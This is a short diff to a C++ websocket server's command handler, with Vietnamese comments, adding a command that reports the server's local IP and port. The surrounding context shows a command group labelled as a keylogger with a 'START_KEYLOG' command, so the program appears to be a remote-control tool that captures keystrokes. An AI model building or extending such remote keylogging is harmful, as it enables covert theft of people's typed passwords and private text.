@@ -111,6 +111,17 @@ void on_message(server* s, websocketpp::connection_hdl hdl, server::message_ptr 
             }
 
             // =============================================================
+            // 2.5. NHÓM LỆNH: SERVER INFO
+            // =============================================================
+            else if (cmd == "GET_SERVER_IP") {
+                std::string serverIP = GetLocalIPAddress();
+                j_res["ip"] = serverIP;
+                j_res["port"] = "9002";
+                j_res["msg"] = "Server IP: " + serverIP;
+                j_res["type"] = "SERVER_INFO";
+            }
+
+            // =============================================================
             // 3. NHÓM LỆNH: KEYLOGGER (BÀN PHÍM)
             // =============================================================
             else if (cmd == "START_KEYLOG") {
